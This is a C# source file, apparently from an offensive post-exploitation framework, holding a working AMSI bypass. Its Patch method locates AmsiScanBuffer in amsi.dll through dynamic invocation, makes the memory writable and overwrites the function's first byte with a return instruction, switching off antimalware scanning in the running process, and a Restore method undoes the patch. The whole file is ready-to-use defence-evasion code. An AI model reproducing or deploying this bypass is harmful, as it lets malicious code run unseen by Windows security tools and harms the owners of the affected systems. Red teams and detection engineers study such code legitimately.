using System;
using System.Runtime.InteropServices;

namespace Drone.SharpSploit.Evasion
{
    public class Amsi
    {
        private readonly byte[] _patch = {0xC3};

        private IntPtr _address;
        private byte[] _original;
        
        public void Patch()
        {
            _address = DInvoke.DynamicInvoke.Generic.GetLibraryAddress(
                "amsi.dll",
                "AmsiScanBuffer",
                true);

            _original = new byte[_patch.Length];
            Marshal.Copy(_address, _original, 0, _patch.Length);

            var size = (IntPtr)_patch.Length; 

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
            
            Marshal.Copy(_patch, 0, _address, _patch.Length);
            
            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                oldProtect);
        }

        public void Restore()
        {
            var size = (IntPtr)_original.Length; 

            var oldProtect = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
            
            Marshal.Copy(_original, 0, _address, _original.Length);
            
            _ = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(
                (IntPtr) (-1),
                ref _address,
                ref size,
                oldProtect);
        }
    }
}